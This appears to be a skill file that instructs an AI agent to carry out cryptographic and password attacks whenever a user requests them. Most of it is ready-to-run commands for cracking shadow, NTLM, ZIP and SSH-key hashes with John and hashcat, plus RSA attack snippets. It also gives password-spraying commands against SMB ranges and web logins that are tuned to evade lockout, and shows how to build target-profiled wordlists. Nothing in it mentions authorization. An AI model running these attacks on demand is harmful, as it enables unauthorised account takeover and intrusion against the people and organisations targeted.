---
name: cryptography-attacks
description: Hash cracking, encryption breaking, crypto analysis.
tags: [cryptography, hash-cracking, john, hashcat, crypto-attacks]
---

# Cryptography Attacks

Use when user requests cryptographic attacks: hash cracking, password recovery, encryption breaking, or cryptanalysis.

## Trigger Conditions
- Hash cracking (MD5, SHA, bcrypt, etc.)
- Password recovery
- Weak encryption exploitation
- RSA attacks
- Cipher analysis
- Rainbow tables
- Dictionary attacks

## Hash Identification

### hashid
```bash
# Install
pip install hashid

# Identify hash
hashid 'e10adc3949ba59abbe56e057f20f883e'
# Output: MD5

# Multiple hashes
hashid -m hashes.txt
# -m shows hashcat mode numbers
```

### hash-identifier
```bash
# Built into Kali
hash-identifier
# Paste hash interactively
```

### Common Hash Formats
```
MD5: 32 hex chars
  e10adc3949ba59abbe56e057f20f883e

SHA1: 40 hex chars
  5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8

SHA256: 64 hex chars
  5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8

SHA512: 128 hex chars
  b109f3bbbc244eb82441917ed06d618b9008dd09b3befd1b5e07394c706a8bb980b1d7785e5976ec049b46df5f1326af5a2ea6d103fd07c95385ffab0cacbc86

bcrypt: $2a$ or $2b$ prefix
  $2a$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy

NTLM (Windows): 32 hex chars
  209c6174da490caeb422f3fa5a7ae634

MySQL5: *UPPER 40 chars
  *2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19
```

## John the Ripper

### Basic Usage
```bash
# Single mode (tries username variations)
john hashes.txt

# Wordlist mode
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Show cracked passwords
john --show hashes.txt

# Specific format
john --format=raw-md5 hashes.txt --wordlist=wordlist.txt
john --format=raw-sha256 hashes.txt --wordlist=wordlist.txt
john --format=bcrypt hashes.txt --wordlist=wordlist.txt
john --format=NT hashes.txt --wordlist=wordlist.txt
```

### Advanced Rules
```bash
# Apply rules (mutations: capitalize, add numbers, etc.)
john --wordlist=wordlist.txt --rules hashes.txt

# Custom rule
# /etc/john/john.conf
# Add under [List.Rules:Custom]:
# $[0-9]$[0-9]  (append two digits)
# c              (capitalize first letter)
john --wordlist=wordlist.txt --rules=Custom hashes.txt

# Incremental mode (brute force)
john --incremental hashes.txt

# Incremental with charset
john --incremental=Digits hashes.txt  # Only numbers
john --incremental=Alpha hashes.txt   # Only letters
```

### Specific Hash Types
```bash
# Linux shadow hashes
unshadow /etc/passwd /etc/shadow > combined.txt
john combined.txt --wordlist=rockyou.txt

# Windows NTLM
john --format=NT ntlm_hashes.txt --wordlist=rockyou.txt

# ZIP password
zip2john encrypted.zip > zip_hash.txt
john zip_hash.txt --wordlist=rockyou.txt

# RAR password
rar2john encrypted.rar > rar_hash.txt
john rar_hash.txt --wordlist=rockyou.txt

# PDF password
pdf2john encrypted.pdf > pdf_hash.txt
john pdf_hash.txt --wordlist=rockyou.txt

# SSH private key password
ssh2john id_rsa > ssh_hash.txt
john ssh_hash.txt --wordlist=rockyou.txt

# Office documents
office2john document.docx > office_hash.txt
john office_hash.txt --wordlist=rockyou.txt
```

## Hashcat

### Basic Usage
```bash
# MD5 (-m 0)
hashcat -m 0 -a 0 hashes.txt wordlist.txt

# SHA256 (-m 1400)
hashcat -m 1400 -a 0 hashes.txt wordlist.txt

# NTLM (-m 1000)
hashcat -m 1000 -a 0 hashes.txt wordlist.txt

# bcrypt (-m 3200)
hashcat -m 3200 -a 0 hashes.txt wordlist.txt

# Show cracked
hashcat -m 0 hashes.txt --show
```

### Attack Modes
```bash
# 0: Straight (wordlist)
hashcat -m 0 -a 0 hashes.txt wordlist.txt

# 1: Combination (combine two wordlists)
hashcat -m 0 -a 1 hashes.txt wordlist1.txt wordlist2.txt

# 3: Brute-force mask
hashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a?a
# ?a = all chars, ?l = lowercase, ?u = uppercase, ?d = digits, ?s = special

# 6: Hybrid wordlist + mask
hashcat -m 0 -a 6 hashes.txt wordlist.txt ?d?d?d
# Tries: password123, password456, etc.

# 7: Hybrid mask + wordlist
hashcat -m 0 -a 7 hashes.txt ?d?d?d wordlist.txt
# Tries: 123password, 456password, etc.
```

### Mask Attacks
```bash
# 8 lowercase letters
hashcat -m 0 -a 3 hashes.txt ?l?l?l?l?l?l?l?l

# Password + 2 digits
hashcat -m 0 -a 3 hashes.txt Password?d?d

# Phone number (Indonesia)
hashcat -m 0 -a 3 hashes.txt 08?d?d?d?d?d?d?d?d?d

# Custom charset
hashcat -m 0 -a 3 hashes.txt -1 ?l?u?d password?1?1?1
# -1 defines custom charset (lowercase + uppercase + digits)
```

### Rules
```bash
# Use built-in rules
hashcat -m 0 -a 0 hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# Popular rules
# best64.rule - 64 best rules
# dive.rule - 24000+ rules
# leetspeak.rule - l33t speak variations
# rockyou-30000.rule - 30k rules

# Combine multiple rules
hashcat -m 0 -a 0 hashes.txt wordlist.txt -r best64.rule -r leetspeak.rule

# Custom rule
# Create rules.txt:
# c - capitalize first
# $1 - append 1
# $! - append !
hashcat -m 0 -a 0 hashes.txt wordlist.txt -r rules.txt
```

### GPU Optimization
```bash
# Show devices
hashcat -I

# Use specific GPU
hashcat -m 0 -a 0 hashes.txt wordlist.txt -d 1

# Workload profile (-w)
# 1: Low (desktop usage)
# 2: Default
# 3: High (dedicated cracking)
# 4: Nightmare (max performance)
hashcat -m 0 -a 0 hashes.txt wordlist.txt -w 4

# Optimize (-O)
hashcat -m 0 -a 0 hashes.txt wordlist.txt -O
```

### Hash Types Reference
```bash
# Common modes:
# 0 - MD5
# 100 - SHA1
# 1000 - NTLM
# 1400 - SHA256
# 1700 - SHA512
# 1800 - sha512crypt (Linux)
# 3200 - bcrypt
# 5600 - NetNTLMv2
# 13100 - Kerberos 5 TGS-REP
# 18200 - Kerberos 5 AS-REP
# 22000 - WPA-PBKDF2-PMKID+EAPOL

# Full list
hashcat --help | grep -i "hash modes"
```

## Rainbow Tables

### RainbowCrack
```bash
# Generate rainbow table
rtgen md5 loweralpha 1 8 0 3800 33554432 0

# Sort table
rtsort *.rt

# Crack hash
rcrack . -h 5d41402abc4b2a76b9719d911017c592
# Cracks in seconds if in table
```

### Online Rainbow Tables
```bash
# CrackStation
curl "https://crackstation.net/api/crack" -d "hash=5d41402abc4b2a76b9719d911017c592"

# HashKiller
# Visit: https://hashkiller.io/listmanager

# Hashes.com
# Visit: https://hashes.com/en/decrypt/hash
```

## Weak Encryption Attacks

### Caesar Cipher
```python
def caesar_crack(ciphertext):
    for shift in range(26):
        plaintext = ""
        for char in ciphertext:
            if char.isalpha():
                shifted = ord(char) - shift
                if char.isupper():
                    if shifted < ord('A'):
                        shifted += 26
                else:
                    if shifted < ord('a'):
                        shifted += 26
                plaintext += chr(shifted)
            else:
                plaintext += char
        print(f"Shift {shift}: {plaintext}")

caesar_crack("KHOOR ZRUOG")
```

### Vigenere Cipher
```bash
# Use online tools or:
# https://www.dcode.fr/vigenere-cipher

# Python library
pip install pycipher
python3 -c "from pycipher import Vigenere; print(Vigenere('KEY').decipher('RIJVS'))"
```

### XOR Bruteforce
```python
def xor_crack(ciphertext):
    for key in range(256):
        plaintext = ""
        for byte in ciphertext:
            plaintext += chr(byte ^ key)
        if "flag" in plaintext.lower():
            print(f"Key: {key} | Plaintext: {plaintext}")

# Example
ciphertext = bytes.fromhex("1c0e1b0a")
xor_crack(ciphertext)
```

### Base64 Decode
```bash
echo "SGVsbG8gV29ybGQ=" | base64 -d

# Repeated base64
echo "U0dWc2JHOGdWMjl5YkdRPQ==" | base64 -d | base64 -d
```

## RSA Attacks

### Small Exponent Attack
```python
# If e=3 and message^3 < n
# Just take cube root
import gmpy2

c = 12345  # ciphertext
e = 3
n = 999999  # modulus

# Cube root
m = gmpy2.iroot(c, e)[0]
print(bytes.fromhex(hex(m)[2:]))
```

### Common Modulus Attack
```python
# If two messages encrypted with same n but different e
# Can recover plaintext without private key
from Crypto.Util.number import inverse, long_to_bytes

n = 12345
c1 = 111
c2 = 222
e1 = 65537
e2 = 3

# Extended GCD
def egcd(a, b):
    if a == 0:
        return (b, 0, 1)
    else:
        g, y, x = egcd(b % a, a)
        return (g, x - (b // a) * y, y)

g, s, t = egcd(e1, e2)
m = (pow(c1, s, n) * pow(c2, t, n)) % n
print(long_to_bytes(m))
```

### Wiener's Attack (Small d)
```bash
# If d is small (d < n^0.25)
git clone https://github.com/pablocelayes/rsa-wiener-attack
cd rsa-wiener-attack
python3 RSAwienerHacker.py

# Input n and e
```

### Factordb (Factor n)
```python
import requests

def factordb(n):
    r = requests.get(f"http://factordb.com/api?query={n}")
    factors = r.json()
    return factors

# If n is factored, recover p and q
# Then compute d = inverse(e, (p-1)*(q-1))
```

## Password Spraying

### Spray Single Password
```bash
# Against multiple accounts
crackmapexec smb 192.168.1.0/24 -u users.txt -p 'Password123'

# Against web login
hydra -L users.txt -p 'Password123' http-post-form "/login:username=^USER^&password=^PASS^:Invalid"

# Avoid lockout: use slow rate
crackmapexec smb 192.168.1.10 -u users.txt -p 'Spring2024!' --delay 60
```

### Common Default Passwords
```
admin
password
Password1
Welcome1
Spring2024
Summer2024
Fall2024
Winter2024
CompanyName2024
CompanyName123
```

## Wordlist Generation

### Crunch
```bash
# Generate 6-8 char passwords (lowercase + digits)
crunch 6 8 abcdefghijklmnopqrstuvwxyz0123456789 -o wordlist.txt

# Pattern-based
crunch 10 10 -t password@@ -o wordlist.txt
# @@ = 2 digits

# Phone numbers (Indonesia)
crunch 11 13 0123456789 -t 08%%%%%%%%% -o phones.txt
```

### Cewl (Web Scraper)
```bash
# Scrape website for password candidates
cewl https://target.com -d 3 -m 6 -w wordlist.txt

# With emails
cewl https://target.com -e --email_file emails.txt
```

### Mentalist (GUI)
```bash
# Install
git clone https://github.com/sc0tfree/mentalist
cd mentalist
python3 mentalist.py

# Build wordlists with:
# - Base words
# - Substitutions (a -> @, o -> 0)
# - Prepend/append rules
# - Capitalization
```

### Cupp (User Profiling)
```bash
# Install
git clone https://github.com/Mebus/cupp
cd cupp
python3 cupp.py -i

# Answer questions about target:
# Name, birthdate, pet, spouse, etc.
# Generates personalized wordlist
```

## Online Hash Cracking

### CrackStation
```bash
# API
curl -X POST https://crackstation.net/api/crack \
  -d "hash=5d41402abc4b2a76b9719d911017c592"
```

### Hashes.com
```
Visit: https://hashes.com/en/decrypt/hash
Paste hash
Submit
```

### CMD5
```
Visit: https://www.cmd5.org/
Supports MD5, SHA1, MySQL, NTLM
```

## Pitfalls
- **Slow hashes**: bcrypt, scrypt very slow to crack
- **Salted hashes**: Each hash needs unique cracking
- **Rate limiting**: Online services limit requests
- **GPU memory**: Large wordlists need lots of VRAM
- **Time**: Strong passwords take years to brute force

## Related Skills
- `privilege-escalation`: Crack hashes from /etc/shadow, SAM
- `post-exploitation`: Dump hashes with Mimikatz
- `network-scanning-recon`: Find authentication endpoints
- `web-exploitation`: Extract password hashes from databases
